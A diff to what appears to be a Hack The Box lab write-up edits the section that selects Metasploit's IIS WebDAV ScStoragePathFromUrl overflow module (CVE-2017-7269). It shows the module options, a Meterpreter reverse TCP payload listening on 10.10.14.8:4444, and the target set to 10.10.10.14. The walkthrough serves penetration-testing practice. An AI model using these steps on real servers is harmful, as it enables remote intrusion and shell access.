@@ -219,74 +219,42 @@ Matching Modules
 
 From the list of all modules related to IIS, the number 15 will be used to exploit the system and get access to it: _Microsoft IIS WebDav ScStoragePathFromUrl Overflow_, which is related to the vulnerability [CVE-2017-7269](https://www.cvedetails.com/cve/CVE-2017-7269/).
 
-So now the _use_ command will be used to select the exploit from the list, and _info_ to get information about it and see what information has to be provided in order to exploit the system:
-
+So now the _use_ command will be used to select the exploit from the list, and _show options_ to get the options that have to be set in order to execute the exploit:
 ```
 msf5 > use exploit/windows/iis/iis_webdav_scstoragepathfromurl
-msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > info
+msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > show options
 
-       Name: Microsoft IIS WebDav ScStoragePathFromUrl Overflow
-     Module: exploit/windows/iis/iis_webdav_scstoragepathfromurl
-   Platform: Windows
-       Arch: 
- Privileged: No
-    License: Metasploit Framework License (BSD)
-       Rank: Manual
-  Disclosed: 2017-03-26
+Module options (exploit/windows/iis/iis_webdav_scstoragepathfromurl):
 
-Provided by:
-  Zhiniang Peng
-  Chen Wu
-  Dominic Chell <dominic@mdsec.co.uk>
-  firefart
-  zcgonvh <zcgonvh@qq.com>
-  Rich Whitcroft
-  Lincoln
+   Name           Current Setting  Required  Description
+   ----           ---------------  --------  -----------
+   MAXPATHLENGTH  60               yes       End of physical path brute force
+   MINPATHLENGTH  3                yes       Start of physical path brute force
+   Proxies                         no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS                          yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
+   RPORT          80               yes       The target port (TCP)
+   SSL            false            no        Negotiate SSL/TLS for outgoing connections
+   TARGETURI      /                yes       Path of IIS 6 web application
+   VHOST                           no        HTTP server virtual host
 
-Available targets:
-  Id  Name
-  --  ----
-  0   Microsoft Windows Server 2003 R2 SP2 x86
 
-Check supported:
-  Yes
+Payload options (windows/meterpreter/reverse_tcp):
 
-Basic options:
-  Name           Current Setting  Required  Description
-  ----           ---------------  --------  -----------
-  MAXPATHLENGTH  60               yes       End of physical path brute force
-  MINPATHLENGTH  3                yes       Start of physical path brute force
-  Proxies                         no        A proxy chain of format type:host:port[,type:host:port][...]
-  RHOSTS                          yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
-  RPORT          80               yes       The target port (TCP)
-  SSL            false            no        Negotiate SSL/TLS for outgoing connections
-  TARGETURI      /                yes       Path of IIS 6 web application
-  VHOST                           no        HTTP server virtual host
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     10.10.14.8       yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
 
-Payload information:
-  Space: 2000
-  Avoid: 1 characters
 
-Description:
-  Buffer overflow in the ScStoragePathFromUrl function in the WebDAV 
-  service in Internet Information Services (IIS) 6.0 in Microsoft 
-  Windows Server 2003 R2 allows remote attackers to execute arbitrary 
-  code via a long header beginning with "If: <http://" in a PROPFIND 
-  request, as exploited in the wild in July or August 2016. Original 
-  exploit by Zhiniang Peng and Chen Wu.
+Exploit target:
 
-References:
-  https://cvedetails.com/cve/CVE-2017-7269/
-  http://www.securityfocus.com/bid/97127
-  https://github.com/edwardz246003/IIS_exploit
-  https://0patch.blogspot.com/2017/03/0patching-immortal-cve-2017-7269.html
-
-Also known as:
-  EXPLODINGCAN
+   Id  Name
+   --  ----
+   0   Microsoft Windows Server 2003 R2 SP2 x86
 ```
 
 The only mandatory option that has to be set is __RHOSTS__, and corresponds to the target (victim) host. So let's set it to the IP address of the HTB machine:
-  
 ```
 msf5 exploit(windows/iis/iis_webdav_scstoragepathfromurl) > set RHOSTS 10.10.10.14
 RHOSTS => 10.10.10.14
